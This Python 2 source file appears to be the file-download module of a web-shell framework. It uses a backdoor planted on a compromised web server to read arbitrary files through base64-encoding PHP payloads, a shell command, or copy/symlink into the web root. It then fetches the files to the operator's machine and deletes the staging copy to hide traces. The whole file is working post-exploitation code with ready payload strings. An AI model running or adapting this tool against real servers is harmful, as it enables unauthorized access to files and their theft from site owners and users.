'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from random import randint

classname = 'Download'
    
class Download(Module):
    '''Download remote binary/ascii files
    :file.download <remote path> <locale path>
    '''
    
    vectors_order = { 'shell.php' : [  "file", "fread", "file_get_contents", "copy", "symlink"], 
                      'shell.sh'  : [ "base64" ]
                     }
    
    vectors = { 'shell.php' : { 
                               "file"             : "print(@base64_encode(implode('', file('%s'))));",
                               "fread"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
                                "file_get_contents"     : "print(@base64_encode(file_get_contents('%s')));",
                                "copy"       : "@copy('compress.zlib://%s','%s') && print(1);",
                                "symlink"     : "@symlink('%s','%s') && print(1);"
                                },
                'shell.sh' : {
                                "base64" : "base64 -w 0 %s"
                                }
               }
    
    
    def __init__(self, modhandler, url, password):
        
        self.encoder_callable = False
        self.md5_callable = False
        
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.transfer_dir = None
        self.transfer_url_dir = None
        
        
        Module.__init__(self, modhandler, url, password)

        
    def _probe(self):
        
        if self.modhandler.load('shell.php').run("is_callable('base64_encode') && print('1');") == '1':
            self.encoder_callable = True
        else:
            print '[' + self.name + '] PHP \'base64_encode\' transfer methods not available.'

            
    def __slack_probe(self, remote_path, local_path):
                
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, remote_path, local_path)
                
        for interpreter in self.vectors:
            if interpreter in self.modhandler.loaded_shells:
                for vector in self.vectors_order[interpreter]:
                    response = self.__execute_payload(interpreter, vector, remote_path, local_path)
                    if response:
                        return response
                    
                    
                    
        raise ModuleException(self.name,  "File download probing failed")     
    
                    
    def __execute_payload(self, interpreter, vector, remote_path, local_path):
        
                    payload = self.vectors[interpreter][vector]
                    
                    if payload.count( '%s' ) == 1:
                        payload = payload % remote_path
                        
                    if (vector == 'copy' or vector == 'symlink') and payload.count( '%s' ) == 2:
                        
                        if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
                            
                            self.transfer_url_dir = self.modhandler.load('find.webdir').url
                            self.transfer_dir = self.modhandler.load('find.webdir').dir
                        
                            filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
                            self.file_path = self.transfer_dir + filename
                            self.url = self.transfer_url_dir + filename
                        
                        payload = payload % (remote_path, self.file_path)
                        
                        
                    response = self.modhandler.load(interpreter).run(payload)
                    
                    if response:
                        
                        self.payload = payload
                        self.interpreter = interpreter
                        self.vector = vector
                        
                        proc_response = self.__process_response(response, remote_path, local_path )
                        return proc_response
  
     
     
    def __process_response(self,response, remote_path, local_path):
        
        if self.vector == 'copy' or self.vector == 'symlink':
            
            
            if self.modhandler.load('file.check').run(self.file_path, 'exists'):
                
                print "[" + self.name + "] Reading file via \'%s\' and removing" % self.url
                
                response = Request(self.url).read()
                
                if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % self.file_path) != '1':
                    print "[!] [" + self.name + "] Error cleaning support file %s" % (self.file_path)
                    
                    
            else:
                    print "[!] [" + self.name + "] Error checking existance of %s" % (self.file_path)
                
            
        else:
            if self.encoder_callable:
                response = b64decode(response)
            
        try:
            f = open(local_path,'wb')
            f.write(response)
            f.close()
        except Exception, e:
            print '[!] [' + self.name + '] Some error occurred writing local file \'%s\'.' % local_path
            raise ModuleException(self.name, e)
        else:
            print '[' + self.name + '] File downloaded to \'%s\' using method \'%s\'' % (local_path, self.vector)
        

        response_md5 = md5(response).hexdigest()
        remote_md5 = self.modhandler.load('file.check').run(remote_path, 'md5', True)
        if not remote_md5:
            print '[!] [' + self.name + '] MD5 hash method is not callable with \'%s\', check disabled' % remote_path
            return response
        elif not  remote_md5 == response_md5:
            print '[' + self.name + '] MD5 hash of \'%s\' file mismatch, file corrupted' % local_path
        else:
            return response

     
    def run(self, remote_path, local_path, returnFileData = False):
        
        if not self.payload or not self.interpreter:
            file_response = self.__slack_probe(remote_path, local_path)
            if returnFileData:
                return file_response
            else:
                return
            
        else:
            response = self.modhandler.load(self.interpreter).run(self.payload)
            
            if response:
                file_response = self.__process_response(response,remote_path, local_path)
                if returnFileData:
                    return file_response
                else:
                    return
                
            raise ModuleException(self.name,  "File read failed")
        
        
            
            
        
